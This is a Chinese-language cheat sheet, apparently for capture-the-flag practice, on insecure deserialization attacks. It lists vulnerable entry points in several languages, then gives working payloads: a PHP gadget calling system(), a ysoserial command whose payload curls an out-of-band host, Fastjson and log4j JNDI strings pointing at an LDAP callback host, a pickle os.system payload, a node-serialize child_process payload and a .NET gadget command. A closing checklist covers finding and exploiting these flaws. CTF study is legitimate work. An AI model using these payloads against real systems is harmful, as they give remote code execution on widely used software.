# 反序列化

## 触发面

| 语言 | 入口 |
|---|---|
| PHP | `unserialize()`、phar:// 协议、session.unserialize |
| Java | `ObjectInputStream.readObject()`、JSON 库（Jackson/Fastjson）类型字段 |
| Python | `pickle.loads()` |
| Node | `node-serialize`、自定义 toJSON |
| .NET | `BinaryFormatter`、`SoapFormatter` |
| Ruby | `Marshal.load` |

## PHP

```php
<?php
class A {
    public $cmd = 'id';
    function __destruct() { system($this->cmd); }
}
echo serialize(new A);
// O:1:"A":1:{s:3:"cmd";s:2:"id";}
```

魔术方法：`__wakeup` / `__destruct` / `__toString` / `__call` / `__get` / `__invoke`
工具：`phpggc <chain> system id`
phar://：上传 phar 文件，让 `file_exists()`/`file_get_contents()` 用 phar 协议读取触发反序列化。

## Java

- 经典 chain：CommonsCollections1-7、CC2、CC4、Beanutils、Hibernate、Jdk7u21
- 工具：`ysoserial.jar`
  ```bash
  java -jar ysoserial.jar CommonsCollections5 'curl http://oob/x' > payload.bin
  ```
- Fastjson：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://oob/x","autoCommit":true}`
- Jackson：`@class` / `@type` 字段
- log4j JNDI：`${jndi:ldap://oob/x}`

## Python pickle

```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(pickle.dumps(E()).hex())
```

服务端用 `pickle.loads(base64.b64decode(...))` 时，base64 编码 payload 再发。

## Node

```js
const serialize = require('node-serialize');
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,o){console.log(o)});}()"}';
serialize.unserialize(payload);
```

## .NET

```bash
ysoserial -f BinaryFormatter -g TextFormattingRunProperties -c "calc"
```

## CTF 检查清单

1. 抓包看 cookie/参数 是否含 base64 编码的二进制（`O:`/`{` PHP/JSON、`gA` 开头 pickle、`AAEA` BinaryFormatter）
2. 在源码或反编译中找 `unserialize`/`readObject`/`pickle.loads`
3. 找类的魔术方法/构造器
4. 用工具生成 payload，PoC 简短试通后再调命令
